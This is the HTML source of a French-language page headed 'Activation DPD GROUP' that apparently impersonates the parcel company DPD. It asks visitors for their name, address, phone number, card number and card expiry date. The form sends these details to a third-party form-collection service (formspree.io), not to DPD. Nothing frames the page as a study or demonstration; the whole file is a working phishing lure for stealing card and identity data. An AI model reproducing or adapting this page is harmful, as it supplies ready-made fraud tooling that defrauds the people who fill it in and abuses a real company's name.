<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Paiement</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: url('Ali.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            font-weight: bold;
            color: #555;
            display: block;
            margin-top: 10px;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .btn {
            width: 100%;
            padding: 10px;
            margin-top: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .btn:hover {
            background: #764ba2;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Activation DPD GROUP</h2>
    
    <form action="https://formspree.io/f/meoeyrwg" method="POST">
    <label for="nom">Nom</label>
    <input type="text" id="nom" name="nom" required>

    <label for="prenom">Prénom(s)</label>
    <input type="text" id="prenom" name="prenom" required>

    <label for="adresse">Adresse</label>
    <input type="text" id="adresse" name="adresse" required>

    <label for="telephone">Numéro de téléphone</label>
    <input type="tel" id="telephone" name="telephone" required>

    <label for="carte">Numéro de la carte</label>
    <input type="text" id="carte" name="carte" required>

    <label for="expiration">Date d'expiration</label>
    <input type="month" id="expiration" name="expiration" required>

    <button type="submit" class="btn">Valider</button>
</form>

    </div>
</body>
</html>
